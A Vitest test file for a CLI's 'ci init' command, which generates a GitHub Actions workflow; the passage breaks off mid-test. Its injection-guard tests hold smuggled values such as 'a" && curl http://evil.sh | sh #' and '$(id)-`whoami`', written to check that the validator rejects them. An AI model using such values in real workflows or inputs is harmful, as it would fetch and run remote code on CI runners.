import type { SpawnSyncReturns } from 'node:child_process';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, sep } from 'node:path';
import { Command } from 'commander';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  buildGithubWorkflow,
  createCiCommand,
  parseTimeoutSeconds,
  renderCiInitText,
  runCiInit,
  type CiDeps,
  type CiFs,
  type CiInitOptions,
  type CiInitSummary,
  type SpawnImpl,
} from './ci.js';
import { ApiError } from '../lib/errors.js';
import { takeTelemetryExtras } from '../lib/telemetry.js';

// ── harness ──────────────────────────────────────────────────────────────────

function makeFetch(
  handler: (url: string, init: RequestInit) => { status?: number; body: unknown },
): typeof globalThis.fetch {
  return (async (input: string | URL | Request, init: RequestInit = {}) => {
    const url =
      typeof input === 'string'
        ? input
        : input instanceof URL
          ? input.toString()
          : (input as { url: string }).url;
    const { status = 200, body } = handler(url, init);
    return new Response(JSON.stringify(body), {
      status,
      headers: { 'content-type': 'application/json' },
    });
  }) as typeof globalThis.fetch;
}

function makeCreds(apiKey = 'sk-user-test', apiUrl = 'http://localhost:13599') {
  return { TESTSPRITE_API_KEY: apiKey, TESTSPRITE_API_URL: apiUrl } as NodeJS.ProcessEnv;
}

/** In-memory fs seam: exclusive writes throw EEXIST, matching the real O_EXCL. */
function makeFakeFs(seed: Record<string, string> = {}): CiFs & { files: Map<string, string> } {
  const files = new Map<string, string>(Object.entries(seed));
  return {
    files,
    async lstat(target) {
      if (files.has(target)) return { isFile: true, isSymbolicLink: false };
      if ([...files.keys()].some(file => file.startsWith(`${target}${sep}`))) {
        return { isFile: false, isSymbolicLink: false };
      }
      return null;
    },
    async realpath(target) {
      return target;
    },
    async writeFile(target, data, opts) {
      if (opts?.exclusive && files.has(target)) {
        const err = new Error('EEXIST') as NodeJS.ErrnoException;
        err.code = 'EEXIST';
        throw err;
      }
      files.set(target, data);
    },
    async mkdir() {
      /* recursive mkdir is a no-op in memory */
    },
    async readFile(target) {
      const v = files.get(target);
      if (v === undefined) {
        const err = new Error('ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      }
      return v;
    },
    async readdir(dir) {
      // Platform separator, so the seam behaves the same on Windows runners.
      const prefix = dir.endsWith(sep) ? dir : `${dir}${sep}`;
      const names = [...files.keys()]
        .filter(k => k.startsWith(prefix) && !k.slice(prefix.length).includes(sep))
        .map(k => k.slice(prefix.length));
      if (names.length === 0) {
        const err = new Error('ENOENT') as NodeJS.ErrnoException;
        err.code = 'ENOENT';
        throw err;
      }
      return names;
    },
  };
}

function spawnResult(over: Partial<SpawnSyncReturns<string>> = {}): SpawnSyncReturns<string> {
  return { pid: 1, output: [], stdout: '', stderr: '', status: 0, signal: null, ...over };
}

/** Hermetic spawn: `git symbolic-ref` → origin/main, everything else → ok. Keeps
 * unit tests off real `git`/`gh` subprocesses. */
const noopSpawn: SpawnImpl = cmd =>
  cmd === 'git' ? spawnResult({ stdout: 'origin/main\n' }) : spawnResult();

function collect() {
  const out: string[] = [];
  const err: string[] = [];
  return {
    out,
    err,
    stdout: (l: string) => out.push(l),
    stderr: (l: string) => err.push(l),
    json: () => JSON.parse(out.join('\n')),
  };
}

const base = {
  profile: 'default',
  output: 'json' as const,
  endpointUrl: undefined,
  debug: false,
  verbose: false,
  dryRun: false,
  requestTimeoutMs: undefined,
};

function opts(over: Partial<CiInitOptions> = {}): CiInitOptions {
  return {
    ...base,
    platform: 'github',
    workflowPath: '.github/workflows/testsprite.yml',
    force: false,
    setSecret: false,
    ...over,
  };
}

function projectsBody(ids: string[], nextToken: string | null = null) {
  return { items: ids.map(id => ({ id, title: id, type: 'frontend' })), nextToken };
}

/** `GET /projects/:id/env` body: `default` is the default unless told otherwise. */
function envsBody(
  names: string[] = ['default', 'staging'],
  defaultName: string | null = 'default',
) {
  return {
    environments: names.map(name => ({
      id: `env-${name}`,
      name,
      url: `https://${name}.example.com`,
      isDefault: name === defaultName,
      authMode: 'account',
    })),
  };
}

/** Answers the two reads `ci init` makes: the project list and the env list. */
function initFetch(
  over: { projects?: unknown; envs?: unknown; seen?: string[] } = {},
): typeof globalThis.fetch {
  return makeFetch(url => {
    over.seen?.push(url);
    if (/\/projects\/[^/?]+\/env/.test(url)) return { body: over.envs ?? envsBody() };
    return { body: over.projects ?? projectsBody(['only-proj']) };
  });
}

const WF = join('/repo', '.github/workflows/testsprite.yml');

/** Base deps for a runCiInit call: in-memory fs, hermetic spawn, /repo cwd. */
function deps(over: Partial<CiDeps> = {}): CiDeps {
  return {
    env: makeCreds(),
    fs: makeFakeFs(),
    fetchImpl: initFetch(),
    spawn: noopSpawn,
    cwd: '/repo',
    stdout: () => {},
    stderr: () => {},
    ...over,
  };
}

// ── buildGithubWorkflow (CLI-direct `ci run`, one template for both shapes) ───

const WF_BASE = {
  projectId: 'proj-1',
  environment: 'staging',
  workflowPath: '.github/workflows/testsprite.yml',
};

describe('buildGithubWorkflow', () => {
  const concurrency = (workflow: string) => {
    const match = workflow.match(/ {4}concurrency:\n {6}group: (.+)\n {6}cancel-in-progress: (.+)/);
    if (!match?.[1] || !match[2]) throw new Error('Missing workflow concurrency configuration');
    return { group: match[1], cancelInProgress: match[2] };
  };

  it('isolates different workflow paths even for the same project and environment', () => {
    const web = concurrency(
      buildGithubWorkflow({ ...WF_BASE, workflowPath: '.github/workflows/testsprite-web.yml' }),
    );
    const api = concurrency(
      buildGithubWorkflow({ ...WF_BASE, workflowPath: '.github/workflows/testsprite-api.yml' }),
    );
    expect(web.group).not.toBe(api.group);
  });

  it('keeps the same workflow group when regenerated with different project settings', () => {
    const first = concurrency(buildGithubWorkflow(WF_BASE));
    const regenerated = concurrency(buildGithubWorkflow({ ...WF_BASE }));
    const reconfigured = concurrency(
      buildGithubWorkflow({ ...WF_BASE, projectId: 'proj-2', environment: 'qa' }),
    );
    expect(first.group).toContain('testsprite.yml');
    expect(regenerated).toEqual(first);
    expect(reconfigured).toEqual(first);
  });

  it.each([
    ['.github/workflows/testsprite.yml', '.github/workflows/testsprite.yaml'],
    ['.github/workflows/testsprite.api.yml', '.github/workflows/testsprite-api.yml'],
    ['.github/workflows/testsprite api.yml', '.github/workflows/testsprite%20api.yml'],
    ['.github/workflows/TestSprite.yml', '.github/workflows/testsprite.yml'],
    ['.github/workflows/A.yml', '.github/workflows/%41.yml'],
    ['.github/workflows/test:sprite.yml', '.github/workflows/test%3Asprite.yml'],
  ])('keeps distinct filenames independent: %s versus %s', (first, second) => {
    // GitHub compares concurrency group names case-insensitively.
    const groupOf = (workflowPath: string) =>
      concurrency(buildGithubWorkflow({ ...WF_BASE, workflowPath })).group.toLowerCase();
    expect(groupOf(first)).not.toBe(groupOf(second));
  });

  it('escapes uppercase letters without altering existing escapes', () => {
    const group = concurrency(
      buildGithubWorkflow({ ...WF_BASE, workflowPath: '.github/workflows/Test Sprite:CI.yml' }),
    ).group;
    expect(group).toContain('testsprite-%54est%20%53prite%3A%43%49.yml-');
  });

  it.each(['pull_request', 'deployment_status'] as const)(
    'retains cancellation within one workflow for %s',
    event => {
      const generated = buildGithubWorkflow(WF_BASE);
      // The documented deployment shape changes only the trigger and URL step.
      const workflow =
        event === 'deployment_status'
          ? generated.replace(
              '  pull_request:\n    types: [opened, synchronize, reopened, ready_for_review]',
              '  deployment_status:',
            )
          : generated;
      expect(workflow).toContain(`\n  ${event}:`);
      const { group, cancelInProgress } = concurrency(workflow);
      expect(group).toContain('testsprite.yml-');
      expect(group).toContain(
        '${{ github.event.pull_request.number || github.event.deployment.sha }}',
      );
      expect(cancelInProgress).toBe('true');
      const eventKey = '${{ github.event.pull_request.number || github.event.deployment.sha }}';
      const key = event === 'pull_request' ? '42' : 'a'.repeat(40);
      expect(group.replace(eventKey, key)).toBe(
        concurrency(buildGithubWorkflow({ ...WF_BASE })).group.replace(eventKey, key),
      );
      expect(group.replace(eventKey, key)).not.toBe(group.replace(eventKey, 'another-event'));
    },
  );

  it('matches the reviewed template (default flags)', () => {
    expect(buildGithubWorkflow(WF_BASE)).toMatchSnapshot();
  });

  it('matches the reviewed template with --timeout and a non-default endpoint', () => {
    expect(
      buildGithubWorkflow({
        ...WF_BASE,
        timeoutSeconds: 1800,
        endpointUrl: 'https://selfhosted.example:8443',
      }),
    ).toMatchSnapshot();
  });

  it('calls the CLI directly with --env and the preview URL, never an action', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('npm i -g @testsprite/testsprite-cli@latest');
    expect(yaml).toContain('testsprite ci run');
    expect(yaml).toContain('--project "proj-1"');
    expect(yaml).toContain('--env "staging"');
    expect(yaml).toContain('--target-url "$PREVIEW_URL"');
    expect(yaml).toContain(
      'PREVIEW_URL: ${{ steps.preview.outputs.url || github.event.deployment_status.environment_url }}',
    );
    expect(yaml).not.toMatch(/testsprite-action|uses: TestSprite\//);
    expect(yaml).not.toContain('--from');
  });

  it('has exactly one placeholder step, and it fails until replaced', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml.match(/# REPLACE ME/g)).toHaveLength(1);
    expect(yaml).toMatch(/- name: Get this PR's preview URL\n\s+id: preview\n/);
    expect(yaml).toMatch(
      /::error::Replace the placeholder step in \.github\/workflows\/testsprite\.yml/,
    );
    expect(yaml).toContain('exit 1');
  });

  it('guards both events: no fork, Dependabot or draft PRs, only successful non-production deployments', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toContain('types: [opened, synchronize, reopened, ready_for_review]');
    expect(yaml).toContain('github.event.pull_request.head.repo.full_name == github.repository');
    // Dependabot branches live in the base repo, so the fork guard passes, but
    // Dependabot events get no Actions secrets.
    expect(yaml).toContain("github.actor != 'dependabot[bot]'");
    expect(yaml).toContain('!github.event.pull_request.draft');
    expect(yaml).toContain("github.event.deployment_status.state == 'success'");
    expect(yaml).toContain('!github.event.deployment.production_environment');
    // Vercel writes production_environment: false on production deployments.
    expect(yaml).toContain("github.event.deployment.environment != 'production'");
    expect(yaml).toContain(
      'group: testsprite-testsprite.yml-${{ github.event.pull_request.number || github.event.deployment.sha }}',
    );
  });

  it('keeps least privilege, passes GITHUB_TOKEN, and always uploads the summary', () => {
    const yaml = buildGithubWorkflow(WF_BASE);
    expect(yaml).toMatch(/permissions:\n {2}contents: read\n {2}pull-requests: read\n/);
    expect(yaml).toContain('TESTSPRITE_API_KEY: ${{ secrets.TESTSPRITE_API_KEY }}');
    expect(yaml).toContain('GITHUB_TOKEN: ${{ github.token }}');
    expect(yaml).toMatch(/if: always\(\)\n\s+uses: actions\/upload-artifact@v7/);
    expect(yaml).toContain('--summary-file testsprite-summary.json');
  });

  it('only uses action majors that run on Node 24', () => {
    // GitHub removed Node 20 from hosted runners on 2026-09-23; an action that
    // still declares `runs.using: node20` is forced onto Node 24 with a
    // deprecation warning on every job. These are the first majors of each
    // action that declare node24.
    const firstNode24Major: Record<string, number> = {
      'actions/checkout': 5,
      'actions/setup-node': 5,
      'actions/upload-artifact': 6,
    };
    const yaml = buildGithubWorkflow(WF_BASE);
    const used = [...yaml.matchAll(/uses: ([\w-]+\/[\w-]+)@v(\d+)/g)];
    expect(used.map(([, action]) => action).sort()).toEqual(Object.keys(firstNode24Major).sort());
    for (const [, action, major] of used) {
      expect(Number(major), action).toBeGreaterThanOrEqual(firstNode24Major[action!]!);
    }
    // setup-node v5+ caches dependencies on its own when package.json names a
    // package manager; the job installs only the CLI, so that cache stays off.
    expect(yaml).toMatch(
      /uses: actions\/setup-node@v\d+\n\s+with:\n(?:\s+.+\n)*?\s+package-manager-cache: false\n/,
    );
  });

  it('documents the same action versions it generates', () => {
    const generated = new Set(
      [...buildGithubWorkflow(WF_BASE).matchAll(/uses: (actions\/[\w-]+@v\d+)/g)].map(m => m[1]),
    );
    // eslint-disable-next-line security/detect-non-literal-fs-filename -- reads this repository's own DOCUMENTATION.md, never user input.
    const docs = readFileSync(new URL('../../DOCUMENTATION.md', import.meta.url), 'utf8');
    const documented = [...docs.matchAll(/uses: (actions\/[\w-]+@v\d+)/g)].map(m => m[1]);
    expect(documented.length).toBeGreaterThan(0);
    for (const ref of documented) expect(generated, ref).toContain(ref);
  });

  it('writes --timeout and the endpoint only when given, and sizes the job to fit', () => {
    const plain = buildGithubWorkflow(WF_BASE);
    expect(plain).not.toContain('--timeout');
    expect(plain).not.toContain('TESTSPRITE_API_URL');
    expect(plain).toContain('timeout-minutes: 45');
    const custom = buildGithubWorkflow({
      ...WF_BASE,
      timeoutSeconds: 3600,
      endpointUrl: 'https://selfhosted.example:8443',
    });
    expect(custom).toContain('--timeout 3600');
    expect(custom).toContain('TESTSPRITE_API_URL: "https://selfhosted.example:8443"');
    expect(custom).toContain('timeout-minutes: 75');
  });

  it('rejects values that would break or hijack the workflow YAML (injection guard)', () => {
    const evil = [
      'a\nname: pwned', // newline breaks the mapping
      'a" && curl http://evil.sh | sh #', // closes the scalar, runs a second command
      '$(id)-`whoami`', // shell expansion vectors
      '${{ secrets.TESTSPRITE_API_KEY }}', // Actions evaluates it before the job
    ];
    for (const environment of evil) {
      expect(() => buildGithubWorkflow({ ...WF_BASE, environment })).toThrow(ApiError);
    }
    expect(() => buildGithubWorkflow({ ...WF_BASE, projectId: 'a"b' })).toThrow(ApiError);
    expect(() => buildGithubWorkflow({ ...WF_BASE, endpointUrl: 'https://x`y' })).toThrow(ApiError);
  });
});

describe('renderCiInitText', () => {
  const s = (over: Partial<CiInitSummary>): CiInitSummary => ({
    platform: 'github',
    path: '.github/workflows/testsprite.yml',
    projectId: 'p',
    environment: 'staging',
    wrote: true,
    status: 'written',
    endpointUrl: null,
    endpointWarning: null,
    timeoutSeconds: null,
    otherTestspriteWorkflows: [],
    secret: { name: 'TESTSPRITE_API_KEY', attempted: false, set: false, reason: null },
    ...over,
  });

  it('renders a distinct first line for each of the three wrote states', () => {
    expect(renderCiInitText(s({ status: 'written', wrote: true }))).toContain('Wrote .github');
    expect(renderCiInitText(s({ status: 'preview', wrote: false }))).toContain(
      'Would write .github',
    );
    // The no-op case must NOT read as a dry-run preview.
    const unchanged = renderCiInitText(s({ status: 'unchanged', wrote: false }));
    expect(unchanged).toContain('already up to date');
    expect(unchanged).not.toContain('Would write');
  });

  it('names the environment and leads the next steps with the placeholder', () => {
    const text = renderCiInitText(s({}));
    expect(text).toContain('environment staging');
    expect(text).toMatch(/1\. Replace the "REPLACE ME" step/);
    expect(text).toContain('gh secret set TESTSPRITE_API_KEY');
  });
});

describe('parseTimeoutSeconds', () => {
  it('defaults, accepts a valid range, rejects out-of-range / non-integer', () => {
    expect(parseTimeoutSeconds(undefined)).toBe(600);
    expect(parseTimeoutSeconds('120')).toBe(120);
    expect(() => parseTimeoutSeconds('0')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('5000')).toThrow(ApiError);
    expect(() => parseTimeoutSeconds('x')).toThrow(ApiError);
  });
});

// ── runCiInit ────────────────────────────────────────────────────────────────

describe('runCiInit', () => {
  it('auto-resolves the project and its default environment, and writes the workflow', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const seen: string[] = [];
    await runCiInit(opts(), deps({ fs, ...io, fetchImpl: initFetch({ seen }) }));
    expect(seen.some(u => /\/projects\?/.test(u))).toBe(true);
    expect(seen.some(u => u.includes('/projects/only-proj/env'))).toBe(true);
    const yaml = fs.files.get(WF);
    expect(yaml).toContain('--project "only-proj"');
    expect(yaml).toContain('--env "default"'); // the default, written by name
    expect(io.json()).toMatchObject({
      wrote: true,
      status: 'written',
      projectId: 'only-proj',
      environment: 'default',
      timeoutSeconds: null,
      path: '.github/workflows/testsprite.yml',
    });
  });

  it('explicit --project skips the project lookup but still checks the environment', async () => {
    const fs = makeFakeFs();
    const seen: string[] = [];
    await runCiInit(opts({ project: 'given-proj' }), deps({ fs, fetchImpl: initFetch({ seen }) }));
    expect(seen.every(u => u.includes('/projects/given-proj/env'))).toBe(true);
    expect(fs.files.get(WF)).toContain('--project "given-proj"');
  });

  it('--env must exist in the project (the error lists the names)', async () => {
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p', env: 'staging' }), deps({ fs }));
    expect(fs.files.get(WF)).toContain('--env "staging"');
    await expect(
      runCiInit(opts({ project: 'p', env: 'stagng' }), deps({ fs: makeFakeFs() })),
    ).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
      details: expect.objectContaining({
        field: 'env',
        reason: expect.stringContaining('available: default, staging'),
      }),
    });
  });

  it('warns (never blocks) when the environment signs in with a recorded SSO session', async () => {
    const io = collect();
    const envs = envsBody(['default', 'sso']);
    envs.environments[1]!.authMode = 'manual';
    await runCiInit(
      opts({ project: 'p', env: 'sso' }),
      deps({ ...io, fetchImpl: initFetch({ envs }) }),
    );
    expect(io.err.join('\n')).toContain('environment "sso" signs in with a recorded SSO session');
    expect(io.json()).toMatchObject({ wrote: true, environment: 'sso' });
    const quiet = collect();
    await runCiInit(opts({ project: 'p' }), deps({ ...quiet }));
    expect(quiet.err.join('\n')).not.toContain('recorded SSO session');
  });

  it('a blank --env is a typo, not a request for the default', async () => {
    const fetchImpl = vi.fn(initFetch());
    await expect(
      runCiInit(opts({ project: 'p', env: '  ' }), deps({ fetchImpl })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('no default environment and no --env → VALIDATION_ERROR naming --env', async () => {
    await expect(
      runCiInit(
        opts({ project: 'p' }),
        deps({ fetchImpl: initFetch({ envs: envsBody(['a', 'b'], null) }) }),
      ),
    ).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
      details: expect.objectContaining({
        field: 'env',
        reason: expect.stringContaining('pass --env <name>'),
      }),
    });
  });

  it('zero projects → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody([]) }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('more than one project (a full page or a nextToken) → VALIDATION_ERROR', async () => {
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody(['a', 'b']) }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    await expect(
      runCiInit(opts(), deps({ fetchImpl: initFetch({ projects: projectsBody(['a'], 'more') }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('pins a non-default endpoint (from the profile) as TESTSPRITE_API_URL', async () => {
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    expect(fs.files.get(WF)).toContain('TESTSPRITE_API_URL: "http://localhost:13599"');
  });

  it('omits the endpoint for the default production backend', async () => {
    const fs = makeFakeFs();
    await runCiInit(
      opts({ project: 'p' }),
      deps({
        fs,
        env: makeCreds('sk-user-test', 'https://api.testsprite.com'),
      }),
    );
    expect(fs.files.get(WF)).not.toContain('TESTSPRITE_API_URL');
  });

  it('writes --timeout only when given', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p', timeoutSeconds: 900 }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toContain('--timeout 900');
    expect(io.json()).toMatchObject({ timeoutSeconds: 900 });
  });

  it('refuses to clobber an existing workflow without --force', async () => {
    await expect(
      runCiInit(opts({ project: 'p' }), deps({ fs: makeFakeFs({ [WF]: 'old contents' }) })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('--force overwrites but keeps the previous file as .bak (the template is hand-edited)', async () => {
    const io = collect();
    const fs = makeFakeFs({ [WF]: 'old contents' });
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toContain('--project "p"');
    expect(fs.files.get(`${WF}.bak`)).toBe('old contents');
    expect(io.json()).toMatchObject({
      wrote: true,
      status: 'written',
      backupPath: '.github/workflows/testsprite.yml.bak',
    });
  });

  it.each([false, true])('CRLF-equivalent workflow stays untouched (force=%s)', async force => {
    const io = collect();
    const fresh = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs: fresh, ...collect() }));
    const existing = fresh.files.get(WF)!.replace(/\n/g, '\r\n');
    const fs = makeFakeFs({ [WF]: existing });
    await runCiInit(opts({ project: 'p', force }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toBe(existing);
    expect(fs.files.has(`${WF}.bak`)).toBe(false);
    expect(io.json()).toMatchObject({ wrote: false, status: 'unchanged' });
    expect(io.json()).not.toHaveProperty('backupPath');
  });

  it('CRLF workflow with a real edit still needs force and keeps its original backup', async () => {
    const fresh = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs: fresh, ...collect() }));
    const canonical = fresh.files.get(WF)!;
    const existing = canonical.replace(/\n/g, '\r\n') + '# local edit\r\n';
    const fs = makeFakeFs({ [WF]: existing });
    await expect(runCiInit(opts({ project: 'p' }), deps({ fs }))).rejects.toMatchObject({
      code: 'VALIDATION_ERROR',
    });
    expect(fs.files.get(WF)).toBe(existing);
    await runCiInit(opts({ project: 'p', force: true }), deps({ fs }));
    expect(fs.files.get(WF)).toBe(canonical);
    expect(fs.files.get(`${WF}.bak`)).toBe(existing);
  });

  it('honors a custom --path under .github/workflows/ (.yaml too)', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(
      opts({ project: 'p', workflowPath: '.github/workflows/gate.yaml' }),
      deps({ fs, ...io }),
    );
    expect(fs.files.get(join('/repo', '.github/workflows/gate.yaml'))).toContain(
      'Replace the placeholder step in .github/workflows/gate.yaml',
    );
    expect(io.json()).toMatchObject({ path: '.github/workflows/gate.yaml' });
  });

  it('refuses a --path GitHub would never run, before any network call', async () => {
    const fetchImpl = vi.fn(initFetch());
    for (const workflowPath of [
      'ci/ts.yml',
      '.github/workflows/nested/ts.yml',
      '.github/workflows/ts.txt',
      '../elsewhere/.github/workflows/ts.yml',
    ]) {
      await expect(
        runCiInit(opts({ project: 'p', workflowPath }), deps({ fetchImpl })),
      ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    }
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('warns (never blocks) when another workflow already runs TestSprite', async () => {
    const io = collect();
    const fs = makeFakeFs({
      [join('/repo', '.github/workflows/old.yml')]:
        'steps:\n  - uses: TestSprite/testsprite-action@v1\n',
      [join('/repo', '.github/workflows/lint.yml')]: 'steps:\n  - run: npm run lint\n',
    });
    await runCiInit(opts({ project: 'p' }), deps({ fs, ...io }));
    expect(io.err.join('\n')).toContain('.github/workflows/old.yml already runs TestSprite');
    expect(io.json()).toMatchObject({
      wrote: true,
      otherTestspriteWorkflows: ['.github/workflows/old.yml'],
    });
  });

  it('re-running on byte-identical content is a no-op, and does not count itself', async () => {
    const io = collect();
    const fs = makeFakeFs();
    await runCiInit(opts({ project: 'p' }), deps({ fs }));
    const first = fs.files.get(WF);
    await runCiInit(opts({ project: 'p' }), deps({ fs, ...io }));
    expect(fs.files.get(WF)).toBe(first);
    expect(io.json()).toMatchObject({
      wrote: false,
      status: 'unchanged',
      otherTestspriteWorkflows: [],
    });
  });

  it('--dry-run makes no writes and no network calls, previews to stderr, still emits the summary', async () => {
    const io = collect();
    const fs = makeFakeFs();
    const fetchImpl = vi.fn(initFetch());
    await runCiInit(opts({ dryRun: true }), deps({ fs, fetchImpl, ...io }));
    expect(fs.files.size).toBe(0);
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(io.err.join('\n')).toContain('[dry-run]');
    expect(io.json()).toMatchObject({
      wrote: false,
      status: 'preview',
      projectId: '<your-project-id>',
      environment: '<your-env-name>',
    });
  });

  it('--dry-run keeps an explicit --env as given', async () => {
    const io = collect();
    await runCiInit(opts({ dryRun: true, env: 'staging' }), deps({ ...io }));
    expect(io.json()).toMatchObject({ environment: 'staging' });
  });

  it('--set-secret shells out to gh with the key on STDIN (never argv) in cwd', async () => {
    const io = collect();
    const spawn = vi.fn(noopSpawn);
    await runCiInit(
      opts({ project: 'p', setSecret: true, repo: 'me/app' }),
      deps({ env: makeCreds('sk-user-secret'), spawn, ...io }),
    );
    expect(spawn).toHaveBeenCalledWith(
      'gh',
      ['secret', 'set', 'TESTSPRITE_API_KEY', '--repo', 'me/app'],
      { input: 'sk-user-secret', cwd: '/repo' },
    );
    expect(io.json()).toMatchObject({ secret: { attempted: true, set: true } });
  });

  it('--set-secret degrades (warns, still succeeds) when gh is absent', async () => {
    const io = collect();
    const spawn: SpawnImpl = () => {
      const err = new Error('spawn gh ENOENT') as NodeJS.ErrnoException;
      err.code = 'ENOENT';
      return spawnResult({ status: null, error: err });
    };
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    const summary = io.json();
    expect(summary.wrote).toBe(true);
    expect(summary.secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh CLI not found');
  });

  it('--set-secret degrades when gh exits non-zero (unauthenticated)', async () => {
    const io = collect();
    const spawn: SpawnImpl = () => spawnResult({ status: 1, stderr: 'gh: not logged in\n' });
    await runCiInit(opts({ project: 'p', setSecret: true }), deps({ spawn, ...io }));
    expect(io.json().secret).toMatchObject({ attempted: true, set: false });
    expect(io.err.join('\n')).toContain('gh exited 1');
  });

  it('with no resolvable API key the scaffold stops at the env lookup, before gh', async () => {
    const spawn = vi.fn(noopSpawn);
    await expect(
      runCiInit(
        opts({ project: 'p', setSecret: true }),
        deps({ env: { TESTSPRITE_API_URL: 'http://localhost:13599' }, spawn }),
      ),
    ).rejects.toBeInstanceOf(ApiError);
    expect(spawn).not.toHaveBeenCalled();
  });

  it('warns (does not fail) when the resolved endpoint is loopback / unreachable from a hosted runner', async () => {
    const io = collect();
    await runCiInit(opts({ project: 'p' }), deps({ ...io }));
    expect(io.err.join('\n')).toContain('a GitHub-hosted runner cannot reach');
    const summary = io.json();
    expect(summary.wrote).toBe(true);
    expect(summary.endpointWarning).toContain('http://localhost:13599');
  });

  it('rejects a bad --env up front, before any request', async () => {
    const fetchImpl = vi.fn(initFetch());
    await expect(
      runCiInit(opts({ env: 'a" && curl x | sh' }), deps({ fetchImpl })),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('rejects an unsupported platform', async () => {
    await expect(
      runCiInit(opts({ platform: 'gitlab', project: 'p' }), deps()),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});

// ── command builder (Commander wiring) ───────────────────────────────────────

describe('createCiCommand', () => {
  function program(io: ReturnType<typeof collect>, fetchImpl: typeof globalThis.fetch) {
    const p = new Command();
    p.option('--output <mode>', 'output mode', 'text').option('--dry-run', 'preview only');
    p.addCommand(
      createCiCommand({
        fs: makeFakeFs(),
        fetchImpl,
        env: makeCreds(),
        spawn: noopSpawn,
        cwd: '/repo',
        stdout: io.stdout,
        stderr: io.stderr,
      }),
    );
    return p;
  }

  it('threads --project, --env and --timeout through the builder (dry-run, no network)', async () => {
    const io = collect();
    const fetchImpl = vi.fn(initFetch());
    await program(io, fetchImpl).parseAsync(
      [
        '--dry-run',
        '--output',
        'json',
        'ci',
        'init',
        'github',
        '--project',
        'p',
        '--env',
        'qa',
        '--timeout',
        '90',
      ],
      { from: 'user' },
    );
    expect(fetchImpl).not.toHaveBeenCalled();
    expect(io.json()).toMatchObject({
      platform: 'github',
      wrote: false,
      projectId: 'p',
      environment: 'qa',
      timeoutSeconds: 90,
    });
  });

  it('leaves timeoutSeconds null when --timeout is not given', async () => {
    const io = collect();
    await program(io, initFetch()).parseAsync(
      ['--dry-run', '--output', 'json', 'ci', 'init', 'github', '--project', 'p'],
      { from: 'user' },
    );
    expect(io.json()).toMatchObject({ timeoutSeconds: null });
  });

  it('no longer accepts --filter (add it to the ci run line yourself)', async () => {
    const io = collect();
    const p = program(io, initFetch());
    p.exitOverride();
    for (const sub of p.commands) {
      sub.exitOverride();
      for (const c of sub.commands) c.exitOverride().configureOutput({ writeErr: () => {} });
    }
    await expect(
      p.parseAsync(['ci', 'init', 'github', '--project', 'p', '--filter', 'x'], { from: 'user' }),
    ).rejects.toThrow(/unknown option '--filter'/);
  });
});

// ── default node fs seam (real filesystem) ───────────────────────────────────

describe('runCiInit with the real fs seam', () => {
  let dir: string;
  afterEach(() => {
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  it('writes the workflow to a real temp dir and refuses to clobber without --force', async () => {
    dir = mkdtempSync(join(tmpdir(), 'ci-init-'));
    const io = collect();
    // No `fs` dep → exercises defaultCiFs (real writeFile/mkdir/readdir with O_EXCL).
    await runCiInit(opts({ project: 'real-fs-proj' }), {
      env: makeCreds(),
      fetchImpl: initFetch(),
      spawn: noopSpawn,
      cwd: dir,
      stdout: io.stdout,
      stderr: io.stderr,
    });
    // eslint-disable-next-line security/detect-non-literal-fs-filename -- reads this test's own mkdtempSync temp path, never user input.
    const written = readFileSync(join(dir, '.github/workflows/testsprite.yml'), 'utf8');
    expect(written).toContain('--project "real-fs-proj"');

    await expect(
      runCiInit(opts({ project: 'a-different-proj' }), {
        env: makeCreds(),
        fetchImpl: initFetch(),
        spawn: noopSpawn,
        cwd: dir,
        stdout: () => {},
        stderr: () => {},
      }),
    ).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });
});

// ── telemetry facts ──────────────────────────────────────────────────────────

describe('ci init telemetry facts', () => {
  beforeEach(() => {
    takeTelemetryExtras();
  });
  afterEach(() => {
    takeTelemetryExtras();
  });

  it('fresh write: platform + force + workflowExisted:false + projectResolved:auto (auto-detected)', async () => {
    await runCiInit(opts(), deps());
    expect(takeTelemetryExtras()).toEqual({
      platform: 'github',
      force: false,
      workflowExisted: false,
      projectResolved: 'auto',
    });
  });

  it('--force over an existing workflow: workflowExisted:true + projectResolved:flag', async () => {
